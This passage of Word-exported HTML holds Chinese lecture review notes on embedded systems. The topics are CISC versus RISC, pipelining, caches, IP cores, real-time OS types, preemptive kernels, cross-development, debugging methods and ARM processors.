Roman"; mso-hansi-font-family: "Times New Roman";'>）具有大量的指令和寻址方式；</span><span lang="EN-US"><span style="font-family: Times New Roman;">80%</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>的程序只使用</span><span lang="EN-US"><span style="font-family: Times New Roman;">20%</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>的指令，大多数程序只使用少量的指令就能够运行。</span><span lang="EN-US"><span style="font-family: Times New Roman;">RISC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：精简指令集（</span><span lang="EN-US"><span style="font-family: Times New Roman;">Reduced Instruction Set Computer)</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>在通道中只包含最有用的指令确保数据通道快速执行每一条指令使</span><span lang="EN-US"><span style="font-family: Times New Roman;">CPU</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>硬件结构设计变得更为简单。指令规整、对称、简单，指令小于</span><span lang="EN-US"><span style="font-family: Times New Roman;">100</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>条，基本寻址方式只有</span><span lang="EN-US"><span style="font-family: Times New Roman;">2</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>～</span><span lang="EN-US"><span style="font-family: Times New Roman;">3</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>种；单周期指令，便于流水操作；大量的寄存器（不少于</span><span lang="EN-US"><span style="font-family: Times New Roman;">32</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>个）。指令系统：</span><span lang="EN-US"><span style="font-family: Times New Roman;">CISC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>指令多，</span><span lang="EN-US"><span style="font-family: Times New Roman;">RISC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>少，通常少于</span><span lang="EN-US"><span style="font-family: Times New Roman;">100</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>；执行时间：</span><span lang="EN-US"><span style="font-family: Times New Roman;">CISC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>有些指令执行时间很长，如整块的存储器内容复制；或将多个寄存器的内容复制到存贮器，</span><span lang="EN-US"><span style="font-family: Times New Roman;">RISC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>没有较长执行时间的指令。编码长度：</span><span lang="EN-US"><span style="font-family: Times New Roman;">CISC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>编码长度可变，</span><span lang="EN-US"><span style="font-family: Times New Roman;">1-15</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>字节，</span><span lang="EN-US"><span style="font-family: Times New Roman;">RISC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>编码长度固定，通常为</span><span lang="EN-US"><span style="font-family: Times New Roman;">4</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>个字节。寻址方式：</span><span lang="EN-US"><span style="font-family: Times New Roman;">CISC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>寻址方式多样，</span><span lang="EN-US"><span style="font-family: Times New Roman;">RISC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>简单寻址。操作：</span><span lang="EN-US"><span style="font-family: Times New Roman;">CISC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>可以对存储器和寄存器进行算术和逻辑操作，</span><span lang="EN-US"><span style="font-family: Times New Roman;">RISC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>只能对寄存器进行算术和逻辑操作，</span><span lang="EN-US"><span style="font-family: Times New Roman;">Load/Store</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>体系结构。编译：</span><span lang="EN-US"><span style="font-family: Times New Roman;">CISC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>难以用优化编译器生成高效的目标代码程序，</span><span lang="EN-US"><span style="font-family: Times New Roman;">RISC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>采用优化编译技术，生成高效的目标代码程序</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>流水线</span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：在</span><span lang="EN-US"><span style="font-family: Times New Roman;">CPU</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>中把一条指令分解成多个可单独处理的操作，使每个操作在一个专门的硬件站（</span><span lang="EN-US"><span style="font-family: Times New Roman;">stage</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>）上执行，这样一条指令需要顺序地经过流水线中多个站的处理才能完成，但是前后相连的几条指令可以依次流入流水线中，在多个站间重叠执行，因此可以实现指令的并行处理。<span style="color: red;">提高了</span></span><span style="color: red;" lang="EN-US"><span style="font-family: Times New Roman;">CPU</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>的运行效率；内部信息流要求通畅流动</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style="color: red;" lang="EN-US"><span style="font-family: Times New Roman;">CACHE</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：</span><span lang="EN-US"><span style="font-family: Times New Roman;">Cache</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>的设计思想：把在一段时间内、一定地址范围中被频繁访问的信息集合，成批地从主存中读到一个能高速存取的小容量存储器中存放起来</span><span lang="EN-US"><span style="font-family: Times New Roman;">,</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>供程序在这段时间内随时使用，从而减少或不再去访问速度较慢的主存，就可以加快程序的运行速度。</span><span lang="EN-US"><span style="font-family: Times New Roman;">1</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>、为什么采用高速缓存：微处理器的时钟频率比内存速度提高快得多，高速缓存可以提高内存的平均性能。</span><span lang="EN-US"><span style="font-family: Times New Roman;">2</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>、高速缓存的工作原理：依据：程序和数据访问的局部性原理。高速缓存是一种小型、快速的存储器，它保存部分主存内容的拷贝。</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style="color: red;" lang="EN-US"><span style="font-family: Times New Roman;">IP</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>核</span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：软核：</span><span lang="EN-US"><span style="font-family: Times New Roman;">HDL</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>语言描述；灵活度高，可修改；与工艺独立，可根据具体的加工工艺重新综合；</span><span lang="EN-US"><span style="font-family: Times New Roman;">IP</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>很难保护。固核：逻辑综合后的描述；与工艺相关。硬核：物理综合后的描述；准备流片；包含工艺相关的布局和时序信息；</span><span lang="EN-US"><span style="font-family: Times New Roman;">IP</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>很容易保护，但灵活性和可移植性差。多数的处理器和存储器。</span><span lang="EN-US"><span style="font-family: Times New Roman;">IP</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>核的商业模型：</span><span lang="EN-US"><span style="font-family: Times New Roman;">1.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>设计者提供设计和工具的许可证；</span><span lang="EN-US"><span style="font-family: Times New Roman;">2.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>核厂商设计并制造集成电路芯片；</span><span lang="EN-US"><span style="font-family: Times New Roman;">3.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>核厂商卖核</span><span lang="EN-US"><span style="font-family: Times New Roman;">, </span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>负责为客户设计并制造芯片。</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>嵌入式</span><span style="color: red;" lang="EN-US"><span style="font-family: Times New Roman;">OS</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>分类及特点</span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：分类：<span style="color: red;">按实时性分</span>，（</span><span lang="EN-US"><span style="font-family: Times New Roman;">1</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>）顺序执行系统：系统内只含有一个程序，独占</span><span lang="EN-US"><span style="font-family: Times New Roman;">CPU</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>的运行时间，按语句顺序执行该程序，直至执行完毕，另一程序才能启动运行。如</span><span lang="EN-US"><span style="font-family: Times New Roman;">DOS</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>操作系统。（</span><span lang="EN-US"><span style="font-family: Times New Roman;">2</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>）分时操作系统：系统内同时可以有多个程序运行，把</span><span lang="EN-US"><span style="font-family: Times New Roman;">CPU</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>的时间按顺序分成若干片，每个时间片内执行不同的程序。如</span><span lang="EN-US"><span style="font-family: Times New Roman;">UNIX</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>操作系统。（</span><span lang="EN-US"><span style="font-family: Times New Roman;">3</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>）实时操作系统：系统内有多个程序运行，每个程序有不同的优先级，只有最高优先级的任务才能占有</span><span lang="EN-US"><span style="font-family: Times New Roman;">CPU</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>的控制权。<span style="color: red;">按实时性的强弱分类</span></span><span lang="EN-US"><span style="font-family: Times New Roman;">:1.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>强</span><span lang="EN-US"><span style="font-family: Times New Roman;">(</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>硬</span><span lang="EN-US"><span style="font-family: Times New Roman;">)</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>实时系统，其系统响应时间在毫秒或微秒级（数控机床）；</span><span lang="EN-US"><span style="font-family: Times New Roman;">2.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>一般实时系统，其系统响应时间在毫秒－几秒的数量级上，其实时性的要求比强实时系统要差一些（电子菜谱的查询）。</span><span lang="EN-US"><span style="font-family: Times New Roman;">3.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>弱</span><span lang="EN-US"><span style="font-family: Times New Roman;">(</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>软</span><span lang="EN-US"><span style="font-family: Times New Roman;">)</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>实时系统，其系统响应时间约为数十秒或更长（工程机械）。<span style="color: red;">特点</span>：<span style="color: red;">实时系统的特点</span>是，如果逻辑和时序出现偏差将会引起严重后果的系统。有两种类型的实时系统：软实时系统和硬实时系统。在<span style="color: red;">软实时系统中</span>系统的宗旨是使各个任务运行得越快越好，并不要求限定某一任务必须在多长时间内完成。在<span style="color: red;">硬实时系统中</span>，各任务不仅要执行无误而且要做到准时。大多数实时系统是二者的结合。实时系统的应用涵盖广泛的领域，而多数实时系统又是嵌入式的。这意味着计算机建在系统内部，用户看不到有个计算机在系统里面。</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>占先内核和非占先内核的区别：</span><span style="color: red;" lang="EN-US"><span style="font-family: Times New Roman;">1.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>占先式内核总是让就绪态的高优先级的任务先运行，中断服务程序可以抢占</span><span lang="EN-US"><span style="font-family: Times New Roman;">CPU</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>，到中断服务完成时，内核让此时优先级最高的任务运行（不一定是那个被中断了的任务）。任务级系统响应时间得到了最优化，且是可知的。</span><span style="font-family: Times New Roman;"><span style="color: red;" lang="EN-US">2</span><span lang="EN-US">.</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>非占先式内核几乎不需要使用信号量保护共享数据。运行着的任务占有</span><span lang="EN-US"><span style="font-family: Times New Roman;">CPU</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>，而不必担心被别的任务抢占。最大缺陷在于其响应高优先级的任务慢，任务已经进入就绪态，但还不能运行，也许要等很长时间，直到当前运行着的任务释放</span><span lang="EN-US"><span style="font-family: Times New Roman;">CPU</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>。</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>第三讲<span style="color: red;">交叉开发环境</span>：交叉开发是指在一台通用计算机上进行软件的编辑编译，然后下载到嵌入式设备中进行运行调试的开发方式。用来开发的通用计算机可以选用比较常见的</span><span lang="EN-US"><span style="font-family: Times New Roman;">PC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>机、工作站等，运行通用的</span><span lang="EN-US"><span style="font-family: Times New Roman;">Windows</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>或</span><span lang="EN-US"><span style="font-family: Times New Roman;">Unix</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>操作系统。开发计算机是宿主机，嵌入式设备是目标机。交叉开发环境提供调试工具对目标机上运行的程序进行调试。由运行于宿主机上的交叉开发软件和宿主机到目标机的调试通道组成。</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>嵌入式系统的调试方法</span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：模拟调试（</span><span lang="EN-US"><span style="font-family: Times New Roman;">Simulator</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>）软件调试（</span><span lang="EN-US"><span style="font-family: Times New Roman;">Debugger</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>）</span><span lang="EN-US"><span style="font-family: Times New Roman;">BDM/JTAG</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>调试（</span><span lang="EN-US"><span style="font-family: Times New Roman;">BDM/JTAG Debugger</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>）全仿真调试（</span><span lang="EN-US"><span style="font-family: Times New Roman;">Emulator</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>）</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>链接文件的作用</span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：</span><span lang="EN-US"><span style="font-family: Times New Roman;">.ld</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>文件</span><span lang="EN-US"><span style="font-family: Times New Roman;">:</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>描述代码链接定位的有关信息，包括代码段，数据段，地址段等，链接器必须使用该文件对整个系统的代码做正确的定位。</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span lang="EN-US"><span style="font-family: Times New Roman;">.map</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>文件</span><span lang="EN-US"><span style="font-family: Times New Roman;">:</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>防止软件调试过程中访问非法存储区时产生异常中断；</span><span lang="EN-US"><span style="font-family: Times New Roman;">.CS</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>文件</span><span lang="EN-US"><span style="font-family: Times New Roman;">:</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>通过一组命令序列来让集成环境自动完成一些特定的功能。汇编源程序</span><span lang="EN-US"><span style="font-family: Times New Roman;">*.s </span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>，</span><span lang="EN-US"><span style="font-family: Times New Roman;">C</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>语言程序</span><span lang="EN-US"><span style="font-family: Times New Roman;">*.c </span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>，链接脚本文件</span><span lang="EN-US"><span style="font-family: Times New Roman;">*.ld</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>，存储区映像文件</span><span lang="EN-US"><span style="font-family: Times New Roman;">*.map</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>，命令脚本文件</span><span lang="EN-US"><span style="font-family: Times New Roman;">*.CS</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>。</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'><span style="font-size: small;">第四讲</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="mso-bookmark: OLE_LINK2;"><span style="font-family: Times New Roman;"><span style="font-size: small;"><span style="color: red;" lang="EN-US">ARM</span><span lang="EN-US"> </span></span></span></span><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：是</span><span lang="EN-US"><span style="font-family: Times New Roman;">Advance RISC Machine</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>的简称，英国计算机公司，主要设计</span><span lang="EN-US"><span style="font-family: Times New Roman;">ARM</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>系列</span><span lang="EN-US"><span style="font-family: Times New Roman;">RISC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>处理器内核而不生产芯片，授权</span><span lang="EN-US"><span style="font-family: Times New Roman;">ARM</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>内核给生产和销售半导体的合作伙伴；处理器内核的名称。</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style="color: red;" lang="EN-US"><span style="font-family: Times New Roman;">ARM</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>微处理器的特点</span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：低功耗、低成本、高性能；采用</span><span lang="EN-US"><span style="font-family: Times New Roman;">RISC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>体系结构；大量使用寄存器；高效的指令系统；除此以外，</span><span lang="EN-US"><span style="font-family: Times New Roman;">ARM</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>体系结构还采用了一些特别的技术，在保证高性能的前提下尽量缩小芯片的面积，并降低功耗。</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style="color: red;" lang="EN-US"><span style="font-family: Times New Roman;">ARM</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>微处理器的主要系列</span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：</span><span lang="EN-US"><span style="font-family: Times New Roman;"> ARM7</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>系列，</span><span lang="EN-US"><span style="font-family: Times New Roman;"> ARM9</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New 